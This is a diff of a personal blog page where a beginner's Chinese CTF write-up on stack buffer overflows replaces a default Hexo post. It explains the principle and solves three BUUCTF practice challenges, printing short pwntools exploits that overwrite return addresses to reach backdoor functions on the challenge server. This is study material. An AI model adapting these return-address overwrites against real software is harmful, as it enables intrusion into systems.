@@ -13,7 +13,7 @@
 
 
 
-<title>Hello World | Mr.BW的妙妙屋</title>
+<title>栈溢出 | Mr.BW的妙妙屋</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Hello World</h1>
+            <h1 class="post-title">栈溢出</h1>
             
                 <div class="post-meta">
                     
@@ -205,28 +205,56 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">五月 11, 2024&nbsp;&nbsp;22:27:17</a>
+                        Date: <a href="#">五月 12, 2024&nbsp;&nbsp;21:59:19</a>
                         </span>
                     
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+            <h5 id="叠个甲"><a href="#叠个甲" class="headerlink" title="叠个甲"></a>叠个甲</h5><p>新手pwner一枚，若出现描述错误，理论错误，或题解错误等欢迎指正</p>
+<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h3><p>栈溢出是指在有限栈空间内存入过大的数据，导致溢出的数据可能会覆盖掉栈空间以外的数据，导致代码执行出错，或泄露受保护的信息等。对于输入时若不进行输入检查，则极易容易造成栈溢出，常见的栈溢出可能发生在<code>gets()</code><code>read()</code>等输入函数。因此做题时注意这些函数的出现。</p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>题目来源：[buuctf](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a>)</p>
+<h4 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h4><p>下载后拖入ida中 </p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/1.png" alt="1"></p>
+<p>nc后直接得到shell</p>
+<h4 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h4><p>拖入ida后查看main 发现<code>gets(s,argv) </code>  控制在此处的输入发生栈溢出。</p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/2.png" alt="2"></p>
+<p>检查数组s</p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/3.png" alt="3"></p>
+<p>大小为0XF字节，再加上8个字节的偏移量控制返回，之后在检查后门函数。</p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/4.png" alt="4"></p>
+<p>发现后门函数，只要控制函数在0X40118A处返回即可得到shell</p>
+<p><em><strong>exp:</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,27573)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0xF+8)+p64(0x40118A)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h4 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h4><p>老规矩，拖入ida</p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/5.png" alt="5"></p>
+<p>发现<code>gets(v5)</code>  检查v5大小 </p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/6.png" alt="6"></p>
+<p>0x40个字节，算上8个控制返回值的偏移量，在检查有无后门函数</p>
+<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/7.png" alt="7"></p>
+<p>发现后门函数，控制函数返回到0x400611即可，与上题不同的是，本题跑通直接得到flag</p>
+<p><em><strong>exp:</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,26457)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.找到可能会引发栈溢出的函数</p>
+<p>2.计算偏移量</p>
+<p>3.找到后门函数地址，以便得到shell or flag</p>
+<p>4.控制函数返回到后门函数的位置</p>
 
         </div>
 
@@ -236,6 +264,14 @@
                 <span>Tag(s):</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
                 </span>
             </div>
             <div>
@@ -246,8 +282,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/05/12/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>
+                <a class="prev" rel="prev" href="/2024/05/22/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8/">pwntools的使用</a>
             
+            
+            <a class="next" rel="next" href="/2024/05/11/hello-world/">Hello World</a>
             
         </section>
 
